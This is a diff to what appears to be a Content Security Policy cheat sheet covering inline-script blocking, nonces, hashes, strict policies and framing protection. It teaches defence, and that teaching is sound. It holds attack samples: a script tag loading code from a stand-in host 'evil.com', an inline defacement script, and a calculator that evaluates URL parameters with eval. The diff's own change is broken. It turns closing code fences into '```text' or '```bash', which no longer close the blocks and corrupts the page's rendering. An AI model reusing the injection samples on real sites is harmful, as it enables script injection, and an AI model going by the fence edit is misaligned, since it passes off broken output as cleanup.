@@ -32,7 +32,7 @@ By preventing the page from executing inline scripts, attacks like injecting
 
 ```html
 <script>document.body.innerHTML='defaced'</script>
-```
+```text
 
  will not work.
 
@@ -42,7 +42,7 @@ By preventing the page from loading scripts from arbitrary servers, attacks like
 
 ```html
 <script src="https://evil.com/hacked.js"></script>
-```
+```text
 
 will not work.
 
@@ -50,13 +50,13 @@ will not work.
 
 By preventing the page from executing text-to-JavaScript functions like `eval`, the website will be safe from vulnerabilities like the this:
 
-```js
+```javascript
 // A Simple Calculator
 var op1 = getUrlParameter("op1");
 var op2 = getUrlParameter("op2");
 var sum = eval(`${op1} + ${op2}`);
 console.log(`The sum is: ${sum}`);
-```
+```text
 
 #### 4. Restricting Form submissions
 
@@ -73,7 +73,7 @@ By restricting where HTML forms on your website can submit their data, injecting
 
 <input type="Submit" value="Login"/>
 </form>
-```
+```text
 
 #### 5. Restricting Objects
 
@@ -103,7 +103,7 @@ Send a Content-Security-Policy HTTP response header from your web server.
 
 ```text
 Content-Security-Policy: ...
-```
+```text
 
 Using a header is the preferred way and supports the full CSP feature set. Send it in all HTTP responses, not just the index page.
 
@@ -115,7 +115,7 @@ Using the `Content-Security-Policy-Report-Only`, you can deliver a CSP that does
 
 ```text
 Content-Security-Policy-Report-Only: ...
-```
+```text
 
 Still, violation reports are printed to the console and delivered to a violation endpoint if the `report-to` and `report-uri` directives are used.
 
@@ -131,7 +131,7 @@ In this case, you can still use CSP by specifying a `http-equiv` meta tag in the
 
 ```html
 <meta http-equiv="Content-Security-Policy" content="...">
-```
+```text
 
 Almost everything is still supported, including full XSS defenses. However, you will not be able to use [framing protections](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors), [sandboxing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox), or a [CSP violation logging endpoint](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to).
 
@@ -162,10 +162,10 @@ __[Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CS
 
 Nonces are unique one-time-use random values that you generate for each HTTP response, and add to the Content-Security-Policy header, like so:
 
-```js
+```javascript
 const nonce = uuid.v4();
 scriptSrc += ` 'nonce-${nonce}'`;
-```
+```text
 
 You would then pass this nonce to your view (using nonces requires a non-static HTML) and render script tags that look something like this:
 
@@ -173,7 +173,7 @@ You would then pass this nonce to your view (using nonces requires a non-static 
 <script nonce="<%= nonce %>">
     ...
 </script>
-```
+```text
 
 #### Warning
 
@@ -185,7 +185,7 @@ When inline scripts are required, the `script-src 'hash_algo-hash'` is another o
 
 ```text
 Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
-```
+```bash
 
 To get the hash, look at Google Chrome developer tools for violations like this:
 
@@ -296,7 +296,7 @@ Content-Security-Policy:
   script-src 'nonce-{RANDOM}' 'strict-dynamic';
   object-src 'none';
   base-uri 'none';
-```
+```text
 
 #### Hash-based Strict Policy
 
@@ -305,7 +305,7 @@ Content-Security-Policy:
   script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
   object-src 'none';
   base-uri 'none';
-```
+```text
 
 ### Basic non-Strict CSP Policy
 
@@ -322,13 +322,13 @@ The most basic policy assumes:
 
 ```text
 Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
-```
+```text
 
 To tighten further, one can apply the following:
 
 ```text
 Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
-```
+```text
 
 This policy allows images, scripts, AJAX, and CSS from the same origin and does not allow any other resources to load (e.g., object, frame, media, etc.).
 
@@ -338,7 +338,7 @@ If the developer is migrating from HTTP to HTTPS, the following directive will e
 
 ```text
 Content-Security-Policy: upgrade-insecure-requests;
-```
+```text
 
 ### Preventing framing attacks (clickjacking, cross-site leaks)
 
@@ -357,14 +357,14 @@ When `default-src` or `script-src*` directives are active, CSP by default disabl
 <script>
 var foo = "314"
 <script>
-```
+```text
 
 The inline code can be moved to a separate JavaScript file and the code in the page becomes:
 
 ```javascript
 <script src="app.js">
 </script>
-```
+```text
 
 With `app.js` containing the `var foo = "314"` code.
 
@@ -372,7 +372,7 @@ The inline code restriction also applies to `inline event handlers`, so that the
 
 ```html
 <button id="button1" onclick="doSomething()">
-```
+```text
 
 This should be replaced by `addEventListener` calls:
 
